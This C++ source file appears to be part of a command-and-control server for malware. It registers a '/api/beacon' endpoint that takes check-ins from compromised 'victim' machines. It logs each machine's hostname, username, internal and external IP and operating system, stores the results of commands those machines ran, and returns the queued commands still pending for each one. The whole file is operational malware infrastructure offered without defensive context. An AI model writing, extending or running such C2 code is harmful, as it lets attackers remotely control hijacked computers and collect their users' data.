#ifdef error
#undef error
#endif
#include <glaze/glaze.hpp>

#include "BeaconEndpoint.hpp"
#include "Beacon.hpp"
#include "CommandService.hpp"
#include "Util/SafeLogger.hpp"
#include "ResultService.hpp"
#include "Types.hpp"
#include "VictimService.hpp"
#include "Endpoints.hpp"

namespace {

HttpResponse handle_beacon_request(const HttpRequest& req) {
    VictimService victims(VictimManager::instance());
    CommandService commands(CommandManager::instance());
    ResultService results(ResultManager::instance());

    BeaconRequest beacon;
    if (auto err = glz::read_json(beacon, req.body)) {
        return error_response(400, "Invalid beacon format");
    }

    logger::info("Client: {} is checking in...", beacon.victim_uid);

    std::string effective_ip = beacon.external_ip;
    if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
        if (!req.ip_address.empty()) {
            effective_ip = req.ip_address;
        }
    }

    VictimDAO v_data;
    v_data.uid = beacon.victim_uid;
    v_data.internal_ip = beacon.internal_ip;
    v_data.external_ip = effective_ip;
    v_data.hostname = beacon.hostname;
    v_data.username = beacon.username;
    v_data.operating_system = beacon.operating_system;
    v_data.last_update = get_unix_time();
    victims.upsert_from_beacon(v_data);

    for (const auto& cmd_result : beacon.command_results) {
        if (auto cmd_opt = commands.get_by_uid(cmd_result.command_uid)) {
            results.store_command_result(cmd_result.command_uid, cmd_result.result_data);
            auto completed = cmd_opt.value();
            commands.mark_completed(completed);
        }
    }

    auto command_list = commands.pending_for_client(beacon.victim_uid);
    for (auto& cmd : command_list) {
        commands.mark_sent(cmd);
    }

    return HttpResponse().set_json(glz::write_json(command_list).value_or("{}"));
}

} // namespace

void register_beacon_endpoint(cpppwn::RESTServer& server) {
    server.post("/api/beacon", [](const HttpRequest& req) {
        try {
            return handle_beacon_request(req);
        } catch (const std::exception& e) {
            logger::warn("Beacon handler failed: {}", e.what());
            return error_response(500, "Internal Server Error");
        }
    });
}

void register_all_beacon_endpoints(cpppwn::RESTServer& server) {
    register_beacon_endpoint(server);
}
